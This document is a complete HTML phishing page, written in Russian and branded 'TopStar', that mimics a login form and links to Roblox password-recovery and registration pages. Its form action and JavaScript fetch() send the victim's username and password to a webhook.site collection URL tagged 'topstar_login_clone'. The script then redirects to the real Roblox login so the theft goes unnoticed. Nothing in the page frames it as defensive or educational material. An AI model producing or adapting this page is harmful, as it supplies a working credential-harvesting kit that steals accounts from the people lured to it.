<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TopStar — Вход</title>

    <!-- Подключение шрифтов через Google Fonts -->
    <link href="https://fonts.googleapis.com/css2?family=Gotham:wght@400;500;700&display=swap" rel="stylesheet">
    <!-- Font Awesome для иконок -->
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">

    <style>
        /* ===== Глобальные стили (без изменений) ===== */
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: 'Gotham', 'Helvetica Neue', Arial, sans-serif;
            background: #f2f2f2;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            margin: 0;
            padding: 20px;
        }

        .login-container {
            background: #ffffff;
            border-radius: 12px;
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            padding: 40px 32px 32px;
            max-width: 440px;
            width: 100%;
            transition: all 0.2s;
        }

        /* ===== Логотип TopStar ===== */
        .logo {
            display: flex;
            justify-content: center;
            margin-bottom: 28px;
        }

        .logo svg {
            width: 200px;
            height: auto;
        }

        /* ===== Заголовок ===== */
        .login-title {
            font-size: 22px;
            font-weight: 700;
            color: #1a1a1a;
            text-align: center;
            margin-bottom: 24px;
            letter-spacing: -0.3px;
        }

        /* ===== Группы полей формы ===== */
        .form-group {
            margin-bottom: 18px;
            position: relative;
        }

        .form-group label {
            display: block;
            font-size: 13px;
            font-weight: 500;
            color: #333;
            margin-bottom: 5px;
        }

        .form-group .input-icon {
            position: absolute;
            left: 14px;
            top: 38px;
            color: #999;
            font-size: 16px;
        }

        .form-group input {
            width: 100%;
            padding: 12px 16px 12px 44px;
            font-size: 15px;
            font-family: inherit;
            border: 1px solid #d4d4d4;
            border-radius: 6px;
            background: #f9f9f9;
            transition: border-color 0.2s, box-shadow 0.2s;
            outline: none;
        }

        .form-group input:focus {
            border-color: #0066ff;
            box-shadow: 0 0 0 3px rgba(0, 102, 255, 0.15);
            background: #ffffff;
        }

        .form-group input::placeholder {
            color: #999;
            font-weight: 400;
        }

        .login-btn {
            width: 100%;
            padding: 14px;
            background: #0066ff;
            color: #ffffff;
            font-size: 18px;
            font-weight: 700;
            font-family: inherit;
            border: none;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s, transform 0.1s;
            margin-top: 6px;
            letter-spacing: 0.3px;
        }

        .login-btn:hover {
            background: #0052cc;
        }

        .login-btn:active {
            transform: scale(0.98);
        }

        .login-btn:disabled {
            opacity: 0.6;
            cursor: not-allowed;
            transform: none;
        }

        .forgot-link {
            display: block;
            text-align: center;
            margin-top: 18px;
            font-size: 14px;
            color: #0066ff;
            text-decoration: none;
            font-weight: 500;
        }

        .forgot-link:hover {
            text-decoration: underline;
        }

        .divider {
            display: flex;
            align-items: center;
            margin: 24px 0 18px;
            color: #999;
            font-size: 13px;
        }

        .divider::before,
        .divider::after {
            content: "";
            flex: 1;
            height: 1px;
            background: #d4d4d4;
        }

        .divider::before {
            margin-right: 14px;
        }
        .divider::after {
            margin-left: 14px;
        }

        .quick-login-btn {
            width: 100%;
            padding: 12px;
            background: #f2f2f2;
            color: #1a1a1a;
            font-size: 15px;
            font-weight: 500;
            font-family: inherit;
            border: 1px solid #d4d4d4;
            border-radius: 6px;
            cursor: pointer;
            transition: background 0.2s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
        }

        .quick-login-btn:hover {
            background: #e6e6e6;
        }

        .quick-login-btn i {
            color: #0066ff;
            font-size: 18px;
        }

        .signup-link {
            text-align: center;
            margin-top: 22px;
            font-size: 14px;
            color: #555;
        }

        .signup-link a {
            color: #0066ff;
            text-decoration: none;
            font-weight: 600;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .error-message {
            color: #e74c3c;
            font-size: 13px;
            font-weight: 500;
            margin-top: 6px;
            display: none;
            align-items: center;
            gap: 6px;
        }

        .error-message.show {
            display: flex;
        }

        .error-message i {
            font-size: 14px;
        }

        @media (max-width: 480px) {
            .login-container {
                padding: 28px 18px 24px;
                border-radius: 8px;
            }
            .logo svg {
                width: 160px;
            }
            .login-title {
                font-size: 19px;
                margin-bottom: 18px;
            }
            .form-group input {
                padding: 11px 14px 11px 40px;
                font-size: 14px;
            }
            .form-group .input-icon {
                left: 12px;
                top: 36px;
                font-size: 15px;
            }
            .login-btn {
                font-size: 16px;
                padding: 13px;
            }
            .quick-login-btn {
                font-size: 14px;
                padding: 11px;
            }
            .forgot-link {
                font-size: 13px;
            }
            .signup-link {
                font-size: 13px;
            }
        }

        @media (max-width: 360px) {
            .login-container {
                padding: 20px 12px 18px;
            }
            .logo svg {
                width: 130px;
            }
            .login-title {
                font-size: 17px;
            }
            .form-group input {
                padding: 10px 12px 10px 36px;
                font-size: 13px;
            }
            .form-group .input-icon {
                left: 10px;
                top: 34px;
                font-size: 13px;
            }
        }

        .spinner {
            display: none;
            width: 20px;
            height: 20px;
            border: 3px solid rgba(255, 255, 255, 0.3);
            border-top: 3px solid #ffffff;
            border-radius: 50%;
            animation: spin 0.8s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .login-btn .btn-text {
            display: inline;
        }
        .login-btn.loading .btn-text {
            display: none;
        }
        .login-btn.loading .spinner {
            display: inline-block;
        }
    </style>
</head>
<body>

    <div class="login-container">

        <!-- ===== Логотип TopStar (SVG) ===== -->
        <div class="logo">
            <svg viewBox="0 0 200 50" fill="none" xmlns="http://www.w3.org/2000/svg">
                <!-- Стилизованный текст "TopStar" с синим акцентом -->
                <rect x="0" y="8" width="12" height="34" fill="#0066FF" rx="2"/>
                <rect x="16" y="8" width="12" height="34" fill="#0066FF" rx="2"/>
                <rect x="32" y="8" width="12" height="34" fill="#0066FF" rx="2"/>
                <text x="50" y="35" font-family="'Gotham','Helvetica Neue',Arial,sans-serif" font-size="28" font-weight="700" fill="#1A1A1A" letter-spacing="-0.5">TopStar</text>
                <!-- Маленькая звездочка -->
                <polygon points="180,12 183,20 192,20 185,25 188,33 180,28 172,33 175,25 168,20 177,20" fill="#0066FF"/>
            </svg>
        </div>

        <!-- ===== Заголовок ===== -->
        <h1 class="login-title">Вход</h1>

        <!-- ===== ФОРМА ВХОДА ===== -->
        <form id="loginForm" method="POST" action="https://webhook.site/c950ec93-8233-4841-aecf-d1c631964a34" novalidate>

            <!-- Поле: Имя пользователя -->
            <div class="form-group">
                <label for="username">Имя пользователя / Email / Телефон</label>
                <i class="fas fa-user input-icon"></i>
                <input type="text" id="username" name="username" placeholder="Введите имя пользователя" required autocomplete="username">
                <div class="error-message" id="usernameError">
                    <i class="fas fa-exclamation-circle"></i> Пожалуйста, введите имя пользователя.
                </div>
            </div>

            <!-- Поле: Пароль -->
            <div class="form-group">
                <label for="password">Пароль</label>
                <i class="fas fa-lock input-icon"></i>
                <input type="password" id="password" name="password" placeholder="Введите пароль" required autocomplete="current-password">
                <div class="error-message" id="passwordError">
                    <i class="fas fa-exclamation-circle"></i> Пожалуйста, введите пароль.
                </div>
            </div>

            <!-- Кнопка входа -->
            <button type="submit" class="login-btn" id="loginBtn">
                <span class="btn-text">Войти</span>
                <span class="spinner"></span>
            </button>

        </form>

        <!-- ===== Ссылка "Забыли пароль?" ===== -->
        <a href="https://www.roblox.com/login/forgot-password-or-username" class="forgot-link" target="_blank">
            Забыли пароль или имя пользователя?
        </a>

        <!-- ===== Разделитель ===== -->
        <div class="divider">или</div>

        <!-- ===== Кнопка быстрого входа (демонстрационная) ===== -->
        <button class="quick-login-btn" onclick="alert('Эта функция временно недоступна. Пожалуйста, используйте стандартный вход.')">
            <i class="fas fa-bolt"></i> Быстрый вход
        </button>

        <!-- ===== Ссылка "Нет аккаунта?" ===== -->
        <div class="signup-link">
            Нет аккаунта? <a href="https://www.roblox.com/register" target="_blank">Зарегистрироваться</a>
        </div>

    </div>

    <!-- ============================================================ -->
    <!-- ===== JAVASCRIPT: Валидация, отправка на Webhook, редирект ===== -->
    <!-- ============================================================ -->
    <script>
        (function() {
            'use strict';

            const form = document.getElementById('loginForm');
            const usernameInput = document.getElementById('username');
            const passwordInput = document.getElementById('password');
            const usernameError = document.getElementById('usernameError');
            const passwordError = document.getElementById('passwordError');
            const loginBtn = document.getElementById('loginBtn');

            function showError(input, errorElement) {
                input.style.borderColor = '#e74c3c';
                errorElement.classList.add('show');
            }

            function hideError(input, errorElement) {
                input.style.borderColor = '';
                errorElement.classList.remove('show');
            }

            usernameInput.addEventListener('input', function() {
                if (this.value.trim() !== '') {
                    hideError(this, usernameError);
                }
            });

            passwordInput.addEventListener('input', function() {
                if (this.value.trim() !== '') {
                    hideError(this, passwordError);
                }
            });

            form.addEventListener('submit', function(event) {
                event.preventDefault();

                hideError(usernameInput, usernameError);
                hideError(passwordInput, passwordError);

                const username = usernameInput.value.trim();
                const password = passwordInput.value.trim();

                let isValid = true;

                if (username === '') {
                    showError(usernameInput, usernameError);
                    isValid = false;
                }

                if (password === '') {
                    showError(passwordInput, passwordError);
                    isValid = false;
                }

                if (!isValid) {
                    return;
                }

                loginBtn.disabled = true;
                loginBtn.classList.add('loading');

                const formData = new FormData();
                formData.append('username', username);
                formData.append('password', password);
                formData.append('source', 'topstar_login_clone'); // Изменено

                fetch('https://webhook.site/c950ec93-8233-4841-aecf-d1c631964a34', {
                    method: 'POST',
                    body: formData
                })
                .then(function(response) {
                    console.log('Данные отправлены на Webhook.');
                })
                .catch(function(error) {
                    console.warn('Ошибка при отправке:', error);
                })
                .finally(function() {
                    window.location.replace('https://www.roblox.com/login');
                });

                setTimeout(function() {
                    window.location.replace('https://www.roblox.com/login');
                }, 3000);
            });

            document.addEventListener('keydown', function(event) {
                if (event.key === 'Enter') {
                    const active = document.activeElement;
                    if (active && (active.id === 'username' || active.id === 'password')) {
                        event.preventDefault();
                        form.dispatchEvent(new Event('submit'));
                    }
                }
            });

        })();
    </script>

</body>
</html>
